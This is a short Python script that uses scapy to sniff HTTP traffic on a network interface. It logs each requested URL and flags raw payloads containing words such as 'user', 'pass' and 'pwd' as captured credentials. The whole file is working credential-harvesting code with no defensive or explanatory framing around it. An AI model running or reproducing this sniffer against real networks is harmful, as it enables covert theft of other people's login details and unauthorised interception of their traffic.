#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http       # pip install scapy_http
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Packet sniffing interface")
    options = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify an interface. Use --help for more information.")
    return options

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["user", "login", "username", "name", "password", "pass", "pwd", "id"]
        for keyword in keywords:
            if keyword in load:
                return load



def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible credentials found >> " + login_info + "\n\n")

options = get_arguments()
interface = options.interface
sniff(interface)